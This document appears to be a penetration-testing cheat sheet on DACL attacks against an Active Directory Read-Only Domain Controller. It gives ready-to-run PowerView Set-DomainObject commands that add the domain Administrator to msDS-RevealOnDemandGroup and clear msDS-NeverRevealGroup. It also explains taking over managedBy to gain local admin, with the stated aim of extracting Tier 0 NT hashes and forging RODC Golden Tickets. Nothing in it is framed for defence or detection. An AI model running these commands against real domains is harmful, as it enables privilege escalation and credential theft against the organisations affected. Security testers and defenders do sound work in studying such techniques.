# DACL Attacks on a Read-Only Domain Controller (RODC)

## 1) GenericWrite

Obtain local admin access

Change the managedBy attribute value and add a controlled user. He will automatically gain admin rights.

Retrieve Tiers 0 account's NT hashes
 
It is possible to modify the msDS-NeverRevealGroup and msDS-RevealOnDemandGroup lists on the RODC to allow Tiers 0 accounts to authenticate, and then forge RODC Golden Tickets for them to access other parts of the AD.

##### Add a domain admin account to the msDS-RevealOnDemandGroup attribute

    Set-DomainObject -Identity RODC-Server$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}

##### If needed, remove the admin from the msDS-NeverRevealGroup attribute

    Set-DomainObject -Identity RODC-Server$ -Clear 'msDS-NeverRevealGroup'

## 2) WriteProperty

WriteProperty on the msDS-NeverRevealGroup and msDS-RevealOnDemandGroup lists is sufficient to modify them. Obtain the krbtgt_XXXXX key is still needed to forge RODC Golden Ticket.

##### Add a domain admin account to the msDS-RevealOnDemandGroup attribute

    Set-DomainObject -Identity RODC-Server$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}

##### If needed, remove the admin from the msDS-NeverRevealGroup attribute

    Set-DomainObject -Identity RODC-Server$ -Clear 'msDS-NeverRevealGroup'
